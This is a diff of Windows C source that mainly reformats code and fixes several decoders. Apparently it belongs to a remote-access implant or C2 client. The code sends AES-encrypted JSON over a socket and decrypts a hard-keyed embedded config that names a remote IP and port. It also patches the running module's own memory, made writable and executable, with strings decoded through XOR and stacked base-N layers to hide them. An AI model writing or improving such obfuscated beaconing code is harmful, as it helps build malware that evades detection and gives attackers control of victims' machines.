@@ -37,28 +37,17 @@ unsigned char* base64_decode(const char* data, size_t input_length, size_t* outp
 }
 
 char* str_replace(const char* orig, const char* rep, const char* with) {
-    char* result;
-    char* ins;
-    char* tmp;
-    int len_rep;
-    int len_with;
-    int len_front;
-    int count;
-
+    char* result; char* ins; char* tmp;
+    int len_rep, len_with, len_front, count;
     if (!orig || !rep) return NULL;
     len_rep = (int)strlen(rep);
     if (len_rep == 0) return NULL;
     if (!with) with = "";
     len_with = (int)strlen(with);
-
     ins = (char*)orig;
-    for (count = 0; (tmp = strstr(ins, rep)); ++count) {
-        ins = tmp + len_rep;
-    }
-
+    for (count = 0; (tmp = strstr(ins, rep)); ++count) { ins = tmp + len_rep; }
     tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);
     if (!result) return NULL;
-
     while (count--) {
         ins = strstr(orig, rep);
         len_front = (int)(ins - orig);
@@ -86,61 +75,43 @@ void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
 
 void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
     if (mutex) WaitForSingleObject(mutex, INFINITE);
-
     cJSON *root = cJSON_CreateObject();
     cJSON_AddStringToObject(root, "type", type);
     cJSON_AddStringToObject(root, "payload", msg);
     char *json_msg = cJSON_PrintUnformatted(root);
-
     char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, (size_t)strlen(json_msg), g_session.key, g_session.iv);
-
     cJSON *packet = cJSON_CreateObject();
     cJSON_AddStringToObject(packet, "data", encrypted);
-
     char *iv_b64 = base64_encode(g_session.iv, 16, NULL);
     cJSON_AddStringToObject(packet, "iv", iv_b64);
-
     char *final_json = cJSON_PrintUnformatted(packet);
-
     char *buf = (char*)malloc(strlen(final_json) + 2);
     sprintf(buf, "%s\n", final_json);
     send(sock, buf, (int)strlen(buf), 0);
-
-    free(buf);
-    free(final_json);
-    free(iv_b64);
-    free(encrypted);
-    free(json_msg);
-    cJSON_Delete(packet);
-    cJSON_Delete(root);
-
+    free(buf); free(final_json); free(iv_b64); free(encrypted); free(json_msg);
+    cJSON_Delete(packet); cJSON_Delete(root);
     if (mutex) ReleaseMutex(mutex);
 }
 
 char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
     CERT_PUBLIC_KEY_INFO *pubKeyInfo = NULL;
-    DWORD pubKeyInfoLen = 0;
-    HCRYPTPROV hProv = 0;
-    HCRYPTKEY hRSAKey = 0;
-    DWORD derLen = 0;
+    DWORD pubKeyInfoLen = 0, derLen = 0;
+    HCRYPTPROV hProv = 0; HCRYPTKEY hRSAKey = 0;
     char* out = NULL;
-
     if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
-        BYTE* der = malloc(derLen);
+        BYTE* der = (BYTE*)malloc(derLen);
         CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL);
         if (CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, der, derLen, CRYPT_DECODE_ALLOC_FLAG, NULL, &pubKeyInfo, &pubKeyInfoLen)) {
             if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                 if (CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, pubKeyInfo, &hRSAKey)) {
-                    DWORD encLen = (DWORD)len;
+                    DWORD encLen = 0;
                     if (CryptEncrypt(hRSAKey, 0, TRUE, 0, NULL, &encLen, 0)) {
-                        BYTE* encBuf = malloc(encLen);
+                        BYTE* encBuf = (BYTE*)malloc(encLen);
                         memcpy(encBuf, data, len);
                         DWORD dataLen = (DWORD)len;
                         if (CryptEncrypt(hRSAKey, 0, TRUE, 0, encBuf, &dataLen, encLen)) {
                             for (DWORD i = 0; i < dataLen / 2; i++) {
-                                BYTE temp = encBuf[i];
-                                encBuf[i] = encBuf[dataLen - 1 - i];
-                                encBuf[dataLen - 1 - i] = temp;
+                                BYTE temp = encBuf[i]; encBuf[i] = encBuf[dataLen - 1 - i]; encBuf[dataLen - 1 - i] = temp;
                             }
                             out = base64_encode(encBuf, dataLen, NULL);
                         }
@@ -158,94 +129,63 @@ char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubke
 }
 
 char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv) {
-    BCRYPT_ALG_HANDLE hAlg = NULL;
-    BCRYPT_KEY_HANDLE hKey = NULL;
+    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
     DWORD cbKeyObject = 0, cbResult = 0, cbCipherText = 0;
     PBYTE pbKeyObject = NULL, pbCipherText = NULL;
     char* out = NULL;
-
     if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return NULL;
     if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
     if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
     pbKeyObject = (PBYTE)malloc(cbKeyObject);
     if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
-
-    BYTE ivCopy[16];
-    memcpy(ivCopy, iv, 16);
+    BYTE ivCopy[16]; memcpy(ivCopy, iv, 16);
     if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING) != 0) goto cleanup;
-    pbCipherText = malloc(cbCipherText);
-    memcpy(ivCopy, iv, 16);
+    pbCipherText = (PBYTE)malloc(cbCipherText); memcpy(ivCopy, iv, 16);
     if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING) != 0) goto cleanup;
     out = base64_encode(pbCipherText, cbResult, NULL);
-
 cleanup:
-    if (pbCipherText) free(pbCipherText);
-    if (hKey) BCryptDestroyKey(hKey);
-    if (pbKeyObject) free(pbKeyObject);
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (pbCipherText) free(pbCipherText); if (hKey) BCryptDestroyKey(hKey); if (pbKeyObject) free(pbKeyObject); if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
     return out;
 }
 
 unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv) {
-    BCRYPT_ALG_HANDLE hAlg = NULL;
-    BCRYPT_KEY_HANDLE hKey = NULL;
+    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
     DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
     PBYTE pbKeyObject = NULL, pbPlain = NULL, pbCipher = NULL;
     size_t cipherLen = 0;
-
-    pbCipher = base64_decode(cipher_b64, strlen(cipher_b64), &cipherLen);
+    pbCipher = (PBYTE)base64_decode(cipher_b64, strlen(cipher_b64), &cipherLen);
     if (!pbCipher) return NULL;
-
     if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) goto cleanup;
     if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
     if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
     pbKeyObject = (PBYTE)malloc(cbKeyObject);
     if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
-
-    BYTE ivCopy[16];
-    memcpy(ivCopy, iv, 16);
+    BYTE ivCopy[16]; memcpy(ivCopy, iv, 16);
     if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, BCRYPT_BLOCK_PADDING) != 0) goto cleanup;
-    pbPlain = (unsigned char*)malloc(cbPlain + 1);
-    memcpy(ivCopy, iv, 16);
+    pbPlain = (unsigned char*)malloc(cbPlain + 1); memcpy(ivCopy, iv, 16);
     if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING) == 0) {
         if (out_len) *out_len = (size_t)cbResult;
     }
-
 cleanup:
-    if (pbCipher) free(pbCipher);
-    if (hKey) BCryptDestroyKey(hKey);
-    if (pbKeyObject) free(pbKeyObject);
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (pbCipher) free(pbCipher); if (hKey) BCryptDestroyKey(hKey); if (pbKeyObject) free(pbKeyObject); if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
     return pbPlain;
 }
 
-static int is_leap(unsigned long long y) {
-    return (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0);
-}
-
+static int is_leap(unsigned long long y) { return (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0); }
 void get_formatted_time(unsigned long long secs, char* out_buf) {
-    unsigned long long minute = (secs % 3600) / 60;
-    unsigned long long hour = (secs % 86400) / 3600;
-    unsigned long long days = secs / 86400;
-    unsigned long long year = 1970;
+    unsigned long long minute = (secs % 3600) / 60, hour = (secs % 86400) / 3600, days = secs / 86400, year = 1970;
     while (1) {
         unsigned long long days_in_year = is_leap(year) ? 366 : 365;
         if (days < days_in_year) break;
-        days -= days_in_year;
-        year++;
+        days -= days_in_year; year++;
     }
     unsigned long long months[] = {31, is_leap(year) ? 29u : 28u, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
     unsigned long long month = 1;
-    for (int i = 0; i < 12; i++) {
-        if (days < months[i]) break;
-        days -= months[i];
-        month++;
-    }
+    for (int i = 0; i < 12; i++) { if (days < months[i]) break; days -= months[i]; month++; }
     sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);
 }
 
-char g_host[256] = {0};
-int g_port = 0;
+char g_host[256] = {0}; int g_port = 0;
 unsigned char g_xor_key[5] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00};
 
 static int b16_val(char c) {
@@ -257,117 +197,82 @@ static int b16_val(char c) {
 
 size_t base16_decode(const char* in, unsigned char* out) {
     size_t len = strlen(in);
-    for (size_t i = 0; i < len / 2; i++) {
-        out[i] = (unsigned char)((b16_val(in[i * 2]) << 4) | b16_val(in[i * 2 + 1]));
-    }
+    for (size_t i = 0; i < len / 2; i++) { out[i] = (unsigned char)((b16_val(in[i * 2]) << 4) | b16_val(in[i * 2 + 1])); }
     return len / 2;
 }
 
 size_t base32_decode(const char* in, unsigned char* out) {
-    static const char ALPHABET[] = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','2','3','4','5','6','7','\0'};
-    int buffer = 0, bits = 0;
-    size_t count = 0;
+    static const unsigned char ALPHABET[32] = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','2','3','4','5','6','7'};
+    int buffer = 0, bits = 0; size_t count = 0;
     for (size_t i = 0; in[i]; i++) {
-        const char* p = strchr(ALPHABET, toupper((unsigned char)in[i]));
-        if (!p) continue;
-        buffer = (buffer << 5) | (int)(p - ALPHABET);
-        bits += 5;
-        if (bits >= 8) {
-            out[count++] = (unsigned char)((buffer >> (bits - 8)) & 0xFF);
-            bits -= 8;
-        }
+        int val = -1; unsigned char c = (unsigned char)toupper((unsigned char)in[i]);
+        for(int k=0; k<32; k++) if(ALPHABET[k] == c) { val = k; break; }
+        if (val == -1) continue;
+        buffer = (buffer << 5) | val; bits += 5;
+        if (bits >= 8) { out[count++] = (unsigned char)((buffer >> (bits - 8)) & 0xFF); bits -= 8; }
     }
     return count;
 }
 
 size_t base58_decode(const char* in, unsigned char* out) {
-    static const char ALPHABET[] = {'1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','J','K','L','M','N','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y','z','\0'};
+    static const unsigned char ALPHABET[58] = {'1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','J','K','L','M','N','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};
     size_t out_len = 0;
     for (size_t i = 0; in[i]; i++) {
-        const char* p = strchr(ALPHABET, in[i]);
-        if (!p) continue;
-        int carry = (int)(p - ALPHABET);
-        for (size_t j = 0; j < out_len; j++) {
-            carry += out[j] * 58;
-            out[j] = (unsigned char)(carry & 0xFF);
-            carry >>= 8;
-        }
-        while (carry) {
-            out[out_len++] = (unsigned char)(carry & 0xFF);
-            carry >>= 8;
-        }
+        int val = -1; for(int k=0; k<58; k++) if(ALPHABET[k] == (unsigned char)in[i]) { val = k; break; }
+        if (val == -1) continue;
+        int carry = val;
+        for (size_t j = 0; j < out_len; j++) { carry += out[j] * 58; out[j] = (unsigned char)(carry & 0xFF); carry >>= 8; }
+        while (carry) { out[out_len++] = (unsigned char)(carry & 0xFF); carry >>= 8; }
     }
     for (size_t i = 0; in[i] == '1'; i++) out[out_len++] = 0;
-    for (size_t i = 0; i < out_len / 2; i++) {
-        unsigned char tmp = out[i];
-        out[i] = out[out_len - 1 - i];
-        out[out_len - 1 - i] = tmp;
-    }
+    for (size_t i = 0; i < out_len / 2; i++) { unsigned char tmp = out[i]; out[i] = out[out_len - 1 - i]; out[out_len - 1 - i] = tmp; }
     return out_len;
 }
 
 size_t base62_decode(const char* in, unsigned char* out) {
-    static const char ALPHABET[] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','\0'};
+    static const unsigned char ALPHABET[62] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};
     size_t out_len = 0;
     for (size_t i = 0; in[i]; i++) {
-        const char* p = strchr(ALPHABET, in[i]);
-        if (!p) continue;
-        int carry = (int)(p - ALPHABET);
-        for (size_t j = 0; j < out_len; j++) {
-            carry += out[j] * 62;
-            out[j] = (unsigned char)(carry & 0xFF);
-            carry >>= 8;
-        }
-        while (carry) {
-            out[out_len++] = (unsigned char)(carry & 0xFF);
-            carry >>= 8;
-        }
+        int val = -1; for(int k=0; k<62; k++) if(ALPHABET[k] == (unsigned char)in[i]) { val = k; break; }
+        if (val == -1) continue;
+        int carry = val;
+        for (size_t j = 0; j < out_len; j++) { carry += out[j] * 62; out[j] = (unsigned char)(carry & 0xFF); carry >>= 8; }
+        while (carry) { out[out_len++] = (unsigned char)(carry & 0xFF); carry >>= 8; }
     }
-    for (size_t i = 0; i < out_len / 2; i++) {
-        unsigned char tmp = out[i];
-        out[i] = out[out_len - 1 - i];
-        out[out_len - 1 - i] = tmp;
-    }
+    for (size_t i = 0; i < out_len / 2; i++) { unsigned char tmp = out[i]; out[i] = out[out_len - 1 - i]; out[out_len - 1 - i] = tmp; }
     return out_len;
 }
 
 size_t base85_decode(const char* in, size_t in_len, unsigned char* out) {
-    size_t out_len = 0;
-    for (size_t i = 0; i < in_len; ) {
-        unsigned int val = 0;
-        int count = 0;
-        for (int j = 0; j < 5 && i < in_len; j++) {
-            val = val * 85 + (unsigned int)(in[i++] - '!');
-            count++;
-        }
+    size_t out_len = 0; unsigned int val = 0; int count = 0;
+    for (size_t i = 0; i < in_len; i++) {
+        unsigned char c = (unsigned char)in[i]; if (isspace(c)) continue;
+        if (c == 'z' && count == 0) { memset(out + out_len, 0, 4); out_len += 4; continue; }
+        if (c < '!' || c > 'u') continue;
+        val = val * 85 + (unsigned int)(c - '!'); count++;
         if (count == 5) {
-            for (int j = 0; j < 4; j++) {
-                out[out_len + 3 - j] = (unsigned char)(val & 0xFF);
-                val >>= 8;
-            }
-            out_len += 4;
+            out[out_len++] = (val >> 24) & 0xFF; out[out_len++] = (val >> 16) & 0xFF;
+            out[out_len++] = (val >> 8) & 0xFF; out[out_len++] = val & 0xFF;
+            val = 0; count = 0;
         }
+    }
+    if (count > 0) {
+        int remaining = count - 1; for (int i = 0; i < 5 - count; i++) val = val * 85 + 84;
+        for (int i = 0; i < remaining; i++) out[out_len++] = (val >> (24 - i * 8)) & 0xFF;
     }
     return out_len;
 }
 
 size_t base91_decode(const char* in, unsigned char* out) {
-    static const char ALPHABET[] = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','!','#','$','%','&','(',')','*','+',',','.','/',':',';','<','=','>','?','@','[',']','^','_','`','{','|','}','~','\"','\0'};
-    unsigned int v = (unsigned int)-1, b = 0, count = 0;
-    size_t out_len = 0;
+    static const unsigned char ALPHABET[91] = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','!','#','$','%','&','(',')','*','+',',','.','/',':',';','<','=','>','?','@','[',']','^','_','`','{','|','}','~','\"'};
+    unsigned int v = (unsigned int)-1, b = 0, count = 0; size_t out_len = 0;
     for (size_t i = 0; in[i]; i++) {
-        const char* p = strchr(ALPHABET, in[i]);
-        if (!p) continue;
-        if (v == (unsigned int)-1) v = (unsigned int)(p - ALPHABET);
+        int val = -1; for(int k=0; k<91; k++) if(ALPHABET[k] == (unsigned char)in[i]) { val = k; break; }
+        if (val == -1) continue;
+        if (v == (unsigned int)-1) v = (unsigned int)val;
         else {
-            v += (unsigned int)(p - ALPHABET) * 91;
-            b |= v << count;
-            count += (v & 8191) > 88 ? 13 : 14;
-            do {
-                out[out_len++] = (unsigned char)(b & 0xFF);
-                b >>= 8;
-                count -= 8;
-            } while (count >= 8);
+            v += (unsigned int)val * 91; b |= v << count; count += (v & 8191) > 88 ? 13 : 14;
+            do { out[out_len++] = (unsigned char)(b & 0xFF); b >>= 8; count -= 8; } while (count >= 8);
             v = (unsigned int)-1;
         }
     }
@@ -381,69 +286,40 @@ void transparent_decryption() {
     if (!hData) return;
     unsigned char* pData = (unsigned char*)LockResource(hData);
     if (!pData) return;
-    unsigned char marker[16];
-    SET_MARKER(marker);
+    unsigned char marker[16]; SET_MARKER(marker);
     if (memcmp(pData, marker, 16) != 0) return;
-
     int num_strings = *(int*)(pData + 16 + 2032);
     if (num_strings <= 0) return;
-
     unsigned char* string_table = pData + 16 + 2032 + 4;
     unsigned char key = g_xor_key[4];
     if (key == 0) return;
-
     HMODULE hMod = GetModuleHandle(NULL);
     for (int i = 0; i < num_strings; i++) {
         unsigned char* entry = string_table + (i * 32);
-        DWORD rva = *(DWORD*)(entry);
-        DWORD orig_len = *(DWORD*)(entry + 4);
-        DWORD res_offset = *(DWORD*)(entry + 8);
-        int steps = *(int*)(entry + 12);
-        unsigned char* step_types = entry + 16;
-
-        if (rva == 0 || orig_len == 0 || orig_len > 8192) continue;
-
+        DWORD rva = *(DWORD*)(entry), orig_len = *(DWORD*)(entry + 4), res_offset = *(DWORD*)(entry + 8);
+        int steps = *(int*)(entry + 12); unsigned char* step_types = entry + 16;
+        if (rva == 0 || orig_len == 0 || orig_len > 32768) continue;
         unsigned char* addr = (unsigned char*)hMod + rva;
         MEMORY_BASIC_INFORMATION mbi;
         if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
             if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
                 DWORD old_protect;
                 if (VirtualProtect(addr, orig_len, PAGE_EXECUTE_READWRITE, &old_protect)) {
-                    static unsigned char buf[16384];
-                    unsigned char* encoded_data = pData + 16 + res_offset;
-                    DWORD enc_len = *(DWORD*)encoded_data;
-                    if (enc_len > 16384) enc_len = 16384;
-                    memcpy(buf, encoded_data + 4, enc_len);
-                    size_t cur_len = enc_len;
-
+                    static unsigned char buf[32768]; unsigned char* encoded_data_start = pData + 16 + 2032 + res_offset;
+                    DWORD enc_len = *(DWORD*)encoded_data_start; if (enc_len > 32768) enc_len = 32768;
+                    memcpy(buf, encoded_data_start + 4, enc_len); size_t cur_len = enc_len;
                     for (int s = steps - 1; s >= 0; s--) {
-                        unsigned char type = step_types[s];
-                        static unsigned char tmp[16384];
-                        if (type == 0) { // XOR
-                            for (size_t k = 0; k < cur_len; k++) buf[k] ^= key;
-                        } else if (type == 1) { // B64
-                            size_t out_l;
-                            unsigned char* d = base64_decode((char*)buf, cur_len, &out_l);
-                            if (d) {
-                                if (out_l <= 16384) { memcpy(buf, d, out_l); cur_len = out_l; }
-                                free(d);
-                            }
-                        } else if (type == 2) { // B32
-                            buf[cur_len] = 0; cur_len = base32_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len);
-                        } else if (type == 3) { // B16
-                            buf[cur_len] = 0; cur_len = base16_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len);
-                        } else if (type == 4) { // B58
-                            buf[cur_len] = 0; cur_len = base58_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len);
-                        } else if (type == 5) { // B62
-                            buf[cur_len] = 0; cur_len = base62_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len);
-                        } else if (type == 6) { // B85
-                            cur_len = base85_decode((char*)buf, cur_len, tmp); memcpy(buf, tmp, cur_len);
-                        } else if (type == 7) { // B91
-                            buf[cur_len] = 0; cur_len = base91_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len);
-                        }
+                        unsigned char type = step_types[s]; static unsigned char tmp[32768];
+                        if (type == 0) { for (size_t k = 0; k < cur_len; k++) buf[k] ^= key; }
+                        else if (type == 1) { size_t out_l; buf[cur_len] = 0; unsigned char* d = base64_decode((char*)buf, cur_len, &out_l); if (d) { if (out_l <= 32768) { memcpy(buf, d, out_l); cur_len = out_l; } free(d); } }
+                        else if (type == 2) { buf[cur_len] = 0; cur_len = base32_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len); }
+                        else if (type == 3) { buf[cur_len] = 0; cur_len = base16_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len); }
+                        else if (type == 4) { buf[cur_len] = 0; cur_len = base58_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len); }
+                        else if (type == 5) { buf[cur_len] = 0; cur_len = base62_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len); }
+                        else if (type == 6) { cur_len = base85_decode((char*)buf, cur_len, tmp); memcpy(buf, tmp, cur_len); }
+                        else if (type == 7) { buf[cur_len] = 0; cur_len = base91_decode((char*)buf, tmp); memcpy(buf, tmp, cur_len); }
                     }
-                    memcpy(addr, buf, (size_t)orig_len);
-                    VirtualProtect(addr, orig_len, old_protect, &old_protect);
+                    memcpy(addr, buf, (size_t)orig_len); VirtualProtect(addr, orig_len, old_protect, &old_protect);
                 }
             }
         }
@@ -457,49 +333,32 @@ void load_config_from_resource() {
     if (!hData) return;
     unsigned char* pData = (unsigned char*)LockResource(hData);
     if (!pData) return;
-    unsigned char marker[16];
-    SET_MARKER(marker);
+    unsigned char marker[16]; SET_MARKER(marker);
     if (memcmp(pData, marker, 16) != 0) return;
-
     unsigned char* encrypted_config = pData + 16;
     size_t config_len = 2032;
-    unsigned char key[32], iv[16];
-    memcpy(key, CONFIG_KEY, 32);
-    memcpy(iv, CONFIG_IV, 16);
-
-    BCRYPT_ALG_HANDLE hAlg = NULL;
-    BCRYPT_KEY_HANDLE hKey = NULL;
+    unsigned char key[32], iv[16]; memcpy(key, CONFIG_KEY, 32); memcpy(iv, CONFIG_IV, 16);
+    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
     DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
     PBYTE pbKeyObject = NULL, pbPlain = NULL;
-
     if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
     if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
     if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
     pbKeyObject = (PBYTE)malloc(cbKeyObject);
     if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
-
-    BYTE ivCopy[16];
-    memcpy(ivCopy, iv, 16);
-    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) {
-        cbPlain = (DWORD)config_len;
-    }
-    pbPlain = (unsigned char*)malloc(cbPlain + 1);
-    memcpy(ivCopy, iv, 16);
+    BYTE ivCopy[16]; memcpy(ivCopy, iv, 16);
+    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) { cbPlain = (DWORD)config_len; }
+    pbPlain = (unsigned char*)malloc(cbPlain + 1); memcpy(ivCopy, iv, 16);
     if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, 0) == 0) {
-        pbPlain[cbResult] = 0;
+        ((unsigned char*)pbPlain)[cbResult] = 0;
         cJSON* root = cJSON_Parse((char*)pbPlain);
         if (root) {
-            cJSON* ip = cJSON_GetObjectItem(root, "ip");
-            cJSON* port = cJSON_GetObjectItem(root, "port");
+            cJSON* ip = cJSON_GetObjectItem(root, "ip"); cJSON* port = cJSON_GetObjectItem(root, "port");
             if (ip) strncpy(g_host, ip->valuestring, sizeof(g_host) - 1);
             if (port) g_port = port->valueint;
             cJSON_Delete(root);
         }
     }
-
 cleanup:
-    if (pbPlain) free(pbPlain);
-    if (hKey) BCryptDestroyKey(hKey);
-    if (pbKeyObject) free(pbKeyObject);
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (pbPlain) free(pbPlain); if (hKey) BCryptDestroyKey(hKey); if (pbKeyObject) free(pbKeyObject); if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
 }
